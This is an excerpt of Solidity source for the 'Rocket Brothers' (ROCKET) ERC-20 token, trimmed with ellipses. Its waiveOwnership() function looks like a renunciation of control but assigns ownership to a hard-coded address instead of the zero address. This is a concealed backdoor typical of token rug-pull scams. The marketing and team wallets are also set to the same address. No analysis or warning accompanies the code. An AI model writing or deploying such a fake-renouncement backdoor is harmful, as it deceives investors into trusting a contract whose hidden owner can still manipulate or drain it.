...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x35400035E789149A8881DFA95853811A00717eAF);
    }
...
contract RocketBrothers is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Rocket Brothers";
    string private _symbol = "ROCKET";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xF6DB9f613645ecBe6Ce0c733107A332BE22dE99A);
    address payable public teamWalletAddress = payable(0xF6DB9f613645ecBe6Ce0c733107A332BE22dE99A);
